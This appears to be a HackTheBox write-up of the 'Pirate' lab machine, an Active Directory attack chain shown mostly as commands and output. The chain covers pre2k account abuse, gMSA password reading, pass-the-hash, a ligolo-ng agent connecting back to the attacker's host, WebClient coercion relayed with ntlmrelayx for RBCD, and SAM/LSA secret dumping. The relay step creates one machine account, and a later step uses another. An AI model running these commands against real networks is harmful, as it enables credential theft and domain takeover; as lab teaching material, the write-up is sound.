---
title: "[EN] - HackTheBox: Pirate Write-Up"
date: 2026-09-18 11:07:00 +0700
categories: [HackTheBox, Boxes, Hard, Windows]
tags: [Pre2000 computers, Pass-the-Hash, Pass-the-Ticket, Credential Reuse, Constrained delegation, WebClient Relay, SPN Jacking, Assume Breach, Kerberos, ACLs abuse, Pivoting]
description: Pirate is a hard-difficulty Windows machine centered on an Active Directory chain where nearly all of the difficulty sits in the enumeration. Starting from assumed-breach credentials, initial enumeration uncovers computer accounts belonging to Pre-Windows 2000 Compatible Access, a group with predictable passwords. One computer account is also a member of a group authorized to read gMSA passwords, granting WinRM access to the Domain Controller. The Domain Controller turns out to be a Hyper-V host fronting an isolated network that holds WEB01, an ADFS server with NTLMv1 enabled and the WebClient service running. Coercing its machine account authentication and relaying it to LDAP grants Resource-Based Constrained Delegation over the host and an Administrator shell. From there, an AutoLogon password leads to a user who can reset their own administrative account. Finally, combining constrained delegation and WriteSPN permissions over four computer accounts enables moving the delegated SPN onto the Domain Controller, also known as SPN Jacking, and achieving final privilege escalation.

image: /assets/img/HTB-Pirate_banner.png
---

As is common in real life pentests, you will start the Pirate box with credentials for the following account :

| Username | Password      |
| -------- | ------------- |
| pentest  | p3nt3st2025!& |

---

## Enumeration

As usual, we start with an Nmap port scan to map out the attack surface.

### Open TCP Ports

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ nmap -Pn -sVC -T4 -p- -oN nmap/TCP_all_services.nmap 10.129.244.95
Starting Nmap <REDACTED> ( https://nmap.org ) at 2026-09-18 16:28 CEST
Nmap scan report for 10.129.244.95
Host is up (0.022s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-18 21:28:43Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-09-18T21:07:29
|_Not valid after:  2027-09-18T21:07:29
|_ssl-date: 2026-09-18T21:30:03+00:00; +7h00m01s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-18T21:30:03+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-09-18T21:07:29
|_Not valid after:  2027-09-18T21:07:29
2179/tcp open  vmrdp?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-09-18T21:07:29
|_Not valid after:  2027-09-18T21:07:29
|_ssl-date: 2026-09-18T21:30:03+00:00; +7h00m01s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-18T21:30:03+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.pirate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.pirate.htb
| Not valid before: 2026-09-18T21:07:29
|_Not valid after:  2027-09-18T21:07:29
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-09-18T21:29:26
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 87.44 seconds
```

The Nmap scan mostly revealed ports commonly associated with a domain controller, such as **DNS** on ``53``, **Kerberos** on ``88``, **LDAP**(s) on ``389/636/3268/3269`` and **SMB** on ``445``, along with one less common port (``2179``), that we would need to investigate further.

### BloodHound Data Collection

Before diving into specific enumeration and since this machine is an assumed breach scenario with provided credentials, we started by collecting BloodHound data for later analysis.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ nxc ldap 10.129.244.95 -d 'pirate.htb' -u 'pentest' -p 'p3nt3st2025!&' --dns-server 10.129.244.95 --bloodhound -c All
LDAP    10.129.244.95   389    DC01      [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)
LDAP    10.129.244.95   389    DC01      [+] pirate.htb\pentest:p3nt3st2025!&
LDAP    10.129.244.95   389    DC01      Resolved collection methods: acl, adcs, container, dcom, group, localadmin, loggedon, objectprops, psremote, rdp, session, trusts
LDAP    10.129.244.95   389    DC01      Excluded collection methods:
LDAP    10.129.244.95   389    DC01      Bloodhound data collection completed in 0M 6S
LDAP    10.129.244.95   389    DC01      Collecting ADCS data (CertiHound)...
LDAP    10.129.244.95   389    DC01      Found 34 certificate templates
LDAP    10.129.244.95   389    DC01      Found 1 Enterprise CAs
LDAP    10.129.244.95   389    DC01      Compressing output into /home/tatsuki/.nxc/logs/DC01_10.129.244.95_2026-09-18_163431_bloodhound.zip

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ mv /home/tatsuki/.nxc/logs/DC01_10.129.244.95_2026-09-18_163431_bloodhound.zip .
```

We then ingested the ZIP file into BloodHound and continued our enumeration.

---

## Initial Access
### Pentest -> MS01$

After performing our usual initial checks (SMB shares, Kerberoasting and so on), we found two pre-created (pre2k) computer accounts, whose default password is derived from the lowercase account name.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ sudo timedatectl set-ntp 0 && faketime "$(rdate -n 10.129.244.95 -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh

┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ $nxc ldap 10.129.244.95 -d 'pirate.htb' -u 'pentest' -p 'p3nt3st2025!&' -M pre2k
LDAP     10.129.244.95   389    DC01      [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)
LDAP     10.129.244.95   389    DC01      [+] pirate.htb\pentest:p3nt3st2025!&
PRE2K    10.129.244.95   389    DC01      Pre-created computer account: MS01$
PRE2K    10.129.244.95   389    DC01      Pre-created computer account: EXCH01$
PRE2K    10.129.244.95   389    DC01      [+] Found 2 pre-created computer accounts. Saved to /home/tatsuki/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt
PRE2K    10.129.244.95   389    DC01      [+] Successfully obtained TGT for ms01@pirate.htb
PRE2K    10.129.244.95   389    DC01      [+] Successfully obtained TGT for exch01@pirate.htb
PRE2K    10.129.244.95   389    DC01      [+] Successfully obtained TGT for 2 (pre-created) computer accounts. Saved to /home/tatsuki/.nxc/modules/pre2k/ccache

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ mv /home/tatsuki/.nxc/modules/pre2k/pirate.htb/precreated_computers.txt .
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ cat precreated_computers.txt
MS01$
EXCH01$

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ mv /home/tatsuki/.nxc/modules/pre2k/ccache/* .
```

### MS01$ -> gMSA_ADFS_prod$

Checking both pre2000 machines groups and ACLs in BloodHound, we found that ``MS01$`` is a member of the ``DOMAIN SECURE SERVERS`` group, which holds the ``ReadGMSAPassword`` ACL over two gMSA accounts.

![](/assets/img/HTB-Pirate-ms01_DACL.png)

Since the pre created computer accounts are not trusted for authentication, we used the TGTs obtained with NetExec to read the passwords of both gMSA accounts :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ sudo timedatectl set-ntp 0 && faketime "$(rdate -n 10.129.244.95 -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ export KRB5CCNAME=ms01.ccache

┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ $klist
Ticket cache: FILE:ms01.ccache
Default principal: ms01@PIRATE.HTB

Valid starting       Expires              Service principal
18/09/2026 20:55:25  19/09/2026 06:55:25  krbtgt/PIRATE.HTB@PIRATE.HTB
        renew until 19/09/2026 20:55:25

┌─[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ $ nxc ldap 'DC01.pirate.htb' -u 'ms01$' -p 'ms01' -k --kdcHost $DC_HOST --gmsa
LDAP    DC01.pirate.htb 389    DC01      [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)
LDAP    DC01.pirate.htb 389    DC01      [+] pirate.htb\ms01$:ms01
LDAP    DC01.pirate.htb 389    DC01      [*] Getting GMSA Passwords
LDAP    DC01.pirate.htb 389    DC01      Account: gMSA_ADCS_prod$      NTLM: aa83XXXXXXXXXXXXXXXXXXXXXX29093e     PrincipalsAllowedToReadPassword: Domain Secure Servers
LDAP    DC01.pirate.htb 389    DC01      Account: gMSA_ADCS_prod$      aes128-cts-hmac-sha1-96: 5a17XXXXXXXXXXXXXXXXXXXXXX3e12fa
LDAP    DC01.pirate.htb 389    DC01      Account: gMSA_ADCS_prod$      aes256-cts-hmac-sha1-96: 5ca2fd1XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXc9cd82f
LDAP    DC01.pirate.htb 389    DC01      Account: gMSA_ADFS_prod$      NTLM: e819XXXXXXXXXXXXXXXXXXXXXXb42307     PrincipalsAllowedToReadPassword: Domain Secure Servers
LDAP    DC01.pirate.htb 389    DC01      Account: gMSA_ADFS_prod$      aes128-cts-hmac-sha1-96: b3beXXXXXXXXXXXXXXXXXXXXXX0c14de
LDAP    DC01.pirate.htb 389    DC01      Account: gMSA_ADFS_prod$      aes256-cts-hmac-sha1-96: 8780bab0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXf992fdc
```

### gMSA_ADFS_prod$ -> DC01

Checking both gMSA accounts group memberships revealed that they belong to ``Remote Management Users``, meaning they can authenticate over WinRM. 
Since we were unable to crack either hash and could only rely on their NTLM hashes, we performed a Pass-the-Hash attack as ``gMSA_ADCS_prod$`` to authenticate to ``DC01``.

![](/assets/img/HTB-Pirate-remote_management_users.png)

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ evil-winrm -i 10.129.244.95 -u 'gMSA_ADCS_prod$' -H 'aa83XXXXXXXXXXXXXXXXXXXXXX29093e'

Evil-WinRM shell <REDACTED>
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> hostname
DC01
```

#### DC01 Local Enumeration

With a foothold on ``DC01``, we started by looking for Hyper-V (port ``2179``, found earlier by Nmap) and located it under the ``C:\Program Files`` directory.

```bash
Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> dir "C:\Program Files"

    Directory: C:\Program Files

Mode             LastWriteTime      Length Name
----             -------------      ------ ----
d-----      6/8/2025   7:33 AM             Common Files
d-----     2/24/2026   4:27 PM             Hyper-V
d-----     2/24/2026   4:27 PM             internet explorer
d-----     7/28/2025   9:08 PM             VMware

<SNIP>
```

Now that we had confirmation Hyper-V was installed, we checked the listening ports to see if any were attached to a VM and found the ip ``192.168.100.1``.

```bash
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address    State         PID
  TCP    0.0.0.0:88             0.0.0.0:0          LISTENING     704
  
<SNIP>

  UDP    192.168.100.1:53       *:*                              2520
  UDP    192.168.100.1:88       *:*                              704
  UDP    192.168.100.1:137      *:*                              4
  UDP    192.168.100.1:138      *:*                              4
  UDP    192.168.100.1:464      *:*                              704

<SNIP>
```

#### Setting up a Pivot to Hyper-V network

To interact with Hyper-V VM's from our attacking host, we set up a pivot on ``DC01`` using ligolo-ng.<br>
First, we downloaded the ligolo-ng agent onto ``DC01`` using evil-winrm upload feature :

```bash
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> upload <PATH>/ligolo-ng/agent.exe

Info: Uploading <PATH>/ligolo-ng/agent.exe to C:\Users\gMSA_ADCS_prod$\Documents\agent.exe
Data: 9831764 bytes of 9831764 bytes copied
Info: Upload successful!
```

Next, we created a new interface on our attacking host for ligolo and added a route to the Hyper-V VM network (``192.168.100.0/24``) :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ sudo ip tuntap add user tatsuki mode tun ligolo && sudo ip link set ligolo up

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ sudo ip route add 192.168.100.0/24 dev ligolo
```

We then started the ligolo-ng proxy server on port ``1102`` :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ sudo ./proxy -selfcert -laddr 0.0.0.0:1102
```

With everything set up, we connected the agent to our server :

```bash
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents> .\agent.exe -connect <parrot_ip>:1102 -ignore-cert
agent.exe : time="2026-09-19T12:08:52-07:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2026-09-2...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2026-09-19T12:08:52-07:00" level=info msg="Connection established" addr="<parrot_ip>:1102"
```

We then started the tunnel on the ligolo-ng server :

```bash
<SNIP>

ligolo-ng » INFO[2461] Agent joined.                                 id=00155d0bd000 name="PIRATE\\gMSA_ADCS_prod$@DC01" remote="10.129.244.95:50035"
ligolo-ng »
ligolo-ng » session
? Specify a session : 1 - PIRATE\gMSA_ADCS_prod$@DC01 - 10.129.244.95:50035 - 00155d0bd000
[Agent : PIRATE\gMSA_ADCS_prod$@DC01] » start --tun ligolo
INFO[2493] Starting tunnel to PIRATE\gMSA_ADCS_prod$@DC01 (00155d0bd000)
```

After setting up the tunnel, we performed a quick host discovery with netexec and retrieved a second machine.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ nxc smb 192.168.100.0/24
SMB     192.168.100.1   445    DC01     [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB     192.168.100.2   445    WEB01    [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:False)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

### WEB01 Enumeration

Next, we enumerated the open TCP ports on WEB01, which had the WebClient service enabled and, despite hosting ADFS-related components, offered no usable ADFS service.

```bash
┌───[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ nmap -Pn -sVC -p- -T4 -oN nmap/WEB01-TCP_all_services.nmap 192.168.100.2
Starting Nmap <REDACTED> ( https://nmap.org ) at 2026-09-18 23:21 CEST
Nmap scan report for WEB01.pirate.htb (192.168.100.2)
Host is up (0.018s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-time:
|   date: 2026-09-19T04:21:55
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.37 seconds
```

Now that we knew which services were available on ``WEB01``, we tested the credentials we had gathered so far and found that ``gMSA_ADFS_prod$`` is a member of the local ``Remote Management Users`` group.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate/pre2k]
└──╼ [★]$ nxc winrm 192.168.100.2 -u 'gMSA_ADFS_prod$' -H 'e819XXXXXXXXXXXXXXXXXXXXXXb42307'
WINRM     192.168.100.2   5985   WEB01     [*] Windows 10 / Server 2019 Build 17763 (name:WEB01) (domain:pirate.htb)
WINRM     192.168.100.2   5985   WEB01     [+] pirate.htb\gMSA_ADFS_prod$:e819XXXXXXXXXXXXXXXXXXXXXXb42307 (Pwn3d!)
```

We then performed a Pass-the-Hash attack to authenticate to ``WEB01``.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate/pre2k]
└──╼ [★]$ evil-winrm -i 192.168.100.2 -u 'gMSA_ADFS_prod$' -H 'e819XXXXXXXXXXXXXXXXXXXXXXb42307'

Evil-WinRM shell <REDACTED>

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$.PIRATE\Documents> hostname
WEB01
```

We uploaded and ran WinPEAS on WEB01 to get a comprehensive overview of the machine's configuration.

```bash
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$.PIRATE\Documents> upload <PATH>/winpeas/winPEASx64.exe

Info: Uploading <PATH>/winpeas/winPEASx64.exe to C:\Users\gMSA_ADFS_prod$.PIRATE\Documents\winPEASx64.exe
Data: 13555712 bytes of 13555712 bytes copied
Info: Upload successful!

*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$.PIRATE\Documents> .\winPEASx64.exe

<SNIP>

ÉÍÍÍÍÍÍÍÍÍÍ¹ Current TCP Listening Ports
È Check for services restricted from the outside
  Enumerating IPv4 connections

Protocol LocalAddress LocalPort RemoteAddress RemotePort State     ProcessID  
ProcessName
TCP      0.0.0.0      80        0.0.0.0       0          Listening 4  
System

<SNIP>

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  PIRATE
    DefaultUserName               :  a.white

<SNIP>

ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating NTLM Settings
  LanmanCompatibilityLevel    : 2 (Send NTLM response only)

  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : False
      ServerNegotiateSigning  : False
      LdapSigning             : Negotiate signing (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require 128-bit encryption)
        [!] NTLM clients support NTLMv1!
      NTLMMinServerSec        : 536870912 (Require 128-bit encryption)

        [!] NTLM services on this machine support NTLMv1!

  NTLM Auditing and Restrictions
      InboundRestrictions     :  (Not defined)
      OutboundRestrictions    :  (Not defined)
      InboundAuditing         :  (Not defined)
      OutboundExceptions      :

<SNIP>
```

WinPEAS confirmed that SMB signing is not enforced on WEB01 and that LDAP signing on the domain is only negotiated rather than required, meaning an NTLM authentication coerced from ``WEB01`` could be relayed to ``DC01``'s LDAP service without being rejected.

### Relaying WEB01 WebClient to DC01

Before coercing ``WEB01``, we needed to add a DNS record pointing to our attacking host, so ``WEB01`` could reach our relay server.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ bloodyAD --host 10.129.244.95 -d 'pirate.htb' -u 'pentest' -p 'p3nt3st2025!&' add dnsRecord "tatsuki" <parrot_ip>
[+] tatsuki has been successfully added

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ dig @10.129.244.95 'tatsuki.pirate.htb' A +short
<parrot_ip>
```

Next, we started [NTLMRelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) with the ``--delegate-access`` flag, so that once it relayed the web client authentication (**HTTP**) from ``WEB01`` to ``DC01`` (**LDAP**), it would automatically create a new machine account and configure Resource-Based Constrained Delegation (RBCD) on WEB01, allowing the new machine account to impersonate users on it.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ sudo ntlmrelayx.py -t 'ldap://DC01.pirate.htb' -smb2support --delegate-access
Impacket <REDACTED> - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client WINRMS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

The `WebClient` service was configured to start automatically on `WEB01` and since the web client service enables authentication coercion over ``HTTP/WebDAV``, we then coerced WEB01's web client service with [Coercer](https://github.com/p0dalirius/coercer) :

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ coercer coerce -u 'pentest' -p 'p3nt3st2025!&' -d 'pirate.htb' -t 'WEB01.pirate.htb' -l 'tatsuki' --auth-type http --dc-ip DC01
       ______
      / ____/___  ___  _____________  _____
     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
    / /___/ /_/ /  __/ /  / /__/  __/ /      <REDACTED>
    \____/\____/\___/_/   \___/\___/_/       by @podalirius_

[info] Starting coerce mode
[info] Scanning target WEB01.pirate.htb
[*] DCERPC portmapper discovered ports: 49664,49665,49668,49706,49707,49684,49687
[+] DCERPC port '49687' is accessible!
   [+] Successful bind to interface (12345678-1234-ABCD-EF00-0123456789AB, 1.0)!
[+] SMB named pipe '\PIPE\efsrpc' is accessible!
   [+] Successful bind to interface (df1941c5-fe89-4e79-bf10-463657acf44d, 1.0)!
      [+] (ERROR_BAD_NETPATH) MS-EFSR──>EfsRpcAddUsersToFile(FileName='\\tatsuki@80/AOL\share\file.txt\x00')
Continue (C) | Skip this function (S) | Stop exploitation (X) ?
```

As we can see below, [NTLMRelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) received the coerced authentication and successfully relayed it to ``DC01`` :

```bash
<SNIP>

[*] Servers started, waiting for connections
[*] (HTTP): Client requested path: /rzn/pipe/srvsvc
[*] (HTTP): Client requested path: /rzn/pipe/srvsvc
[*] (HTTP): Connection from 10.129.244.95 controlled, attacking target ldap://DC01.pirate.htb
[*] (HTTP): Client requested path: /rzn/pipe/srvsvc
[*] (HTTP): Authenticating connection from PIRATE/WEB01$@10.129.244.95 against ldap://DC01.pirate.htb SUCCEED [1]
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Enumerating relayed user's privileges. This may take a while on large domains
[*] (HTTP): Client requested path: /rzn/pipe/srvsvc
[*] (HTTP): Client requested path: /rzn/pipe/srvsvc
[*] (HTTP): Connection from 10.129.244.95 controlled, attacking target ldap://DC01.pirate.htb
[*] (HTTP): Client requested path: /rzn/pipe/srvsvc
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Adding a machine account to the domain requires TLS but ldap:// scheme provided. Switching target to LDAPS via StartTLS
[*] (HTTP): Authenticating connection from PIRATE/WEB01$@10.129.244.95 against ldap://DC01.pirate.htb SUCCEED [2]
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [2] -> Enumerating relayed user's privileges. This may take a while on large domains
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Attempting to create computer in: CN=Computers,DC=pirate,DC=htb
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Adding new computer with username: AUKCUHCI$ and password: !p9Z<$ne,lgBAWA result: OK
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> Delegation rights modified succesfully!
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [1] -> AUKCUHCI$ can now impersonate users on WEB01$ via S4U2Proxy
[*] ldap://PIRATE/WEB01$@dc01.pirate.htb [2] -> Delegate attack already performed for this computer, skipping
```

We confirmed the newly created computer account and its delegation permissions.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ nxc ldap 10.129.244.95 -u 'pentest' -p 'p3nt3st2025!&' --find-delegation
LDAP    10.129.244.95   389    DC01    [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)
LDAP    10.129.244.95   389    DC01    [+] pirate.htb\pentest:p3nt3st2025!&
LDAP    10.129.244.95   389    DC01    AccountName AccountType DelegationType                     DelegationRightsTo
LDAP    10.129.244.95   389    DC01    ----------- ----------- ---------------------------------- ---------------------------------------
LDAP    10.129.244.95   389    DC01    a.white_adm Person      Constrained w/ Protocol Transition http/WEB01.pirate.htb, HTTP/WEB01
LDAP    10.129.244.95   389    DC01    AUKCUHCI$   Computer    Resource-Based Constrained         WEB01$
```

As shown above, the attack successfully created a new machine account with RBCD configured. We then used this machine account to request a service ticket on ``WEB01`` for the local ``administrator``.


```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ sudo timedatectl set-ntp 0 && faketime "$(rdate -n 10.129.244.95 -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ $ getST.py -spn 'cifs/WEB01.pirate.htb' -impersonate administrator -dc-ip 10.129.244.95 'pirate.htb/DMPXBPMM$:1rL<W+MpC.-XmKL'
Impacket v<REDACTED> - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

We then used the **CIFS** service ticket to dump the ``SAM`` and ``LSA`` secrets on ``WEB01``.

```bash
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ export KRB5CCNAME=administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ klist
Ticket cache: FILE:administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
Default principal: administrator@pirate.htb

Valid starting       Expires              Service principal
18/09/2026 04:20:42  19/09/2026 14:20:42  cifs/WEB01.pirate.htb@PIRATE.HTB
        renew until 19/09/2026 04:20:43
        
┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ [★]$ sudo timedatectl set-ntp 0 && faketime "$(rdate -n 10.129.244.95 -p | awk '{print $2, $3, $4}' | date -f - "+%Y-%m-%d %H:%M:%S")" zsh

┌──[tatsuki@parrot]─[~/Documents/HTB/Boxes/Hard/Pirate]
└──╼ $ nxc smb 'WEB01.pirate.htb' -k --use-kcache --lsa --sam
SMB    WEB01.pirate.htb 445    WEB01     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WEB01) (domain:pirate.htb) (signing:False) (SMBv1:False)
SMB    WEB01.pirate.htb 445    WEB01     [+] pirate.htb\administrator from ccache (Pwn3d!)
SMB    WEB01.pirate.htb 445    WEB01     [*] Dumping SAM hashes
SMB    WEB01.pirate.htb 445    WEB01     Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aaXXXXXXXXXXXXXXXXXXXXXX4fc3e5:::

<SNIP>

SMB    WEB01.pirate.htb 445    WEB01     PIRATE\a.white:E2nXXXXXXXXXXXJu

<SNIP>
```

